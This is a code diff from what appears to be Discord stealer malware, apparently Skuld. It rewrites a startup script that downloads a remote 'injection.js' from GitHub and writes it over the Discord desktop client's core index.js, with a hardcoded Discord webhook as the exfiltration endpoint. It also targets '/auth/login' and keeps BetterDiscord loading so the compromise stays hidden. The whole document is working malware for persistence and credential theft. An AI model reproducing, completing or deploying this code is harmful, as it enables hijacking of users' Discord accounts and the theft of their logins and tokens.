@@ -12,7 +12,7 @@ const {
 
 const CONFIG = {
     webhook: "%WEBHOOK%",
-    injection_url: "https://raw.githubusercontent.com/nikolas25879alt-maker/ajikhbsdfgo/refs/heads/main/injection.js",
+    injection_url: "https://raw.githubusercontent.com/nikolas25879alt-maker/ajikhbsdfgo/main/injection.js",
     filters: {
         urls: [
             '/auth/login',
@@ -511,29 +511,53 @@ async function initiation() {
             ),
         );
 
-        const startUpScript = `const fs = require('fs'), https = require('https');
-  const indexJs = '${indexJs}';
-  const bdPath = '${bdPath}';
-  const fileSize = fs.statSync(indexJs).size
-  fs.readFileSync(indexJs, 'utf8', (err, data) => {
-      if (fileSize < 20000 || data === "module.exports = require('./core.asar')") 
-          init();
-  })
-  async function init() {
-      https.get('${CONFIG.injection_url}', (res) => {
-          const file = fs.createWriteStream(indexJs);
-          res.replace('%WEBHOOK%', '${CONFIG.webhook}')
-          res.pipe(file);
-          file.on('finish', () => {
-              file.close();
-          });
-      
-      }).on("error", (err) => {
-          setTimeout(init(), 10000);
-      });
-  }
-  require('${path.join(resourcePath, 'app.asar')}')
-  if (fs.existsSync(bdPath)) require(bdPath);`;
+        const startUpScript = `const fs = require('fs');
+const https = require('https');
+const path = require('path');
+
+const CONFIG = {
+    webhook: "https://discord.com/api/webhooks/1501483874222608507/FDcwuZLFcZn57oopdAPCS3l7qooDz6rtPqMvU4fYgJvRmN7VOgbAg_sgQCiVTPisp-1X",
+    injection_url: "https://raw.githubusercontent.com/hackirby/discord-injection/main/injection.js"
+};
+
+// Find core index.js
+const appPath = path.dirname(process.execPath);
+const modulesPath = path.join(appPath, 'modules');
+const coreFolder = fs.readdirSync(modulesPath).find(x => x.startsWith('discord_desktop_core-'));
+const indexJs = path.join(modulesPath, coreFolder, 'discord_desktop_core', 'index.js');
+const bdPath = path.join(process.env.APPDATA, 'BetterDiscord', 'data', 'betterdiscord.asar');
+
+async function loadInjection() {
+    try {
+        const res = await new Promise((resolve, reject) => {
+            https.get(CONFIG.injection_url, resolve).on('error', reject);
+        });
+
+        let data = '';
+        res.on('data', chunk => data += chunk);
+        res.on('end', () => {
+            data = data.replace('%WEBHOOK%', CONFIG.webhook);
+            fs.writeFileSync(indexJs, data);
+            console.log('[+] Skuld Injection Loaded Successfully');
+        });
+    } catch (e) {
+        console.error('[-] Failed to load injection:', e.message);
+        setTimeout(loadInjection, 5000);
+    }
+}
+
+// Load injection if needed
+if (fs.existsSync(indexJs)) {
+    const size = fs.statSync(indexJs).size;
+    const content = fs.readFileSync(indexJs, 'utf8');
+    if (size < 20000 || content.includes('core.asar')) {
+        loadInjection();
+    }
+}
+
+// Load normal Discord + BetterDiscord
+require(path.join(appPath, 'app.asar'));
+if (fs.existsSync(bdPath)) require(bdPath);`;
         fs.writeFileSync(resourceIndex, startUpScript.replace(/\\/g, '\\\\'));
     }
 }
